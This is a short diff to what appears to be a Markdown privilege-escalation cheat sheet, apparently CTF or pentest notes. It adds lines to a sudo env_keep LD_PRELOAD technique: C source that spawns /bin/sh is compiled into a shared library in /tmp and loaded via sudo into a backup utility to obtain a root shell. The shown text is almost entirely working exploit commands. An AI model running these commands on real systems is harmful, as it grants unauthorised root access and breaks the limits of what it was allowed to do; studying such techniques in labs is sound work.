@@ -114,6 +114,7 @@ chmod +x rev
 <details><summary>env_keep += LD_PRELOAD</summary>
 
 ```
+cd /tmp
 cat > shell.c << EOF
 #include <stdio.h>
 #include <sys/types.h>
@@ -126,6 +127,7 @@ system("/bin/sh");
 }
 EOF
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
 
 </details>
